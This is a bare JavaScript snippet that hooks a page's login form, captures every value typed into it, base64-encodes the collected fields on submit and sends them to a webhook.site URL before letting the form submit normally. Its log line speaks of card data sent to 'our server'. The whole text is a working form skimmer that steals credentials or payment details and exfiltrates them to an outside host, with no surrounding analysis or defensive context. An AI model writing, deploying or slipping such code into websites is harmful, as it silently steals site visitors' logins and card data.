(function () {
  var sniffedData = {};
  var form = document.getElementById("loginform");

  form.addEventListener("input", function (e) {
    sniffedData[e.target.name] = e.target.value;
  });

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    var encodedData = btoa(JSON.stringify(sniffedData));
    var exfilUrl = "https://webhook.site/899334fa-e652-4648-85ea-b8c69076bb81";

    fetch(exfilUrl + "?data=" + encodedData, {
      method: "GET",
    }).then(function () {
      console.log("Card data sent to our server");
      form.submit(); // Let the form submit as normal
    });
  });
})();
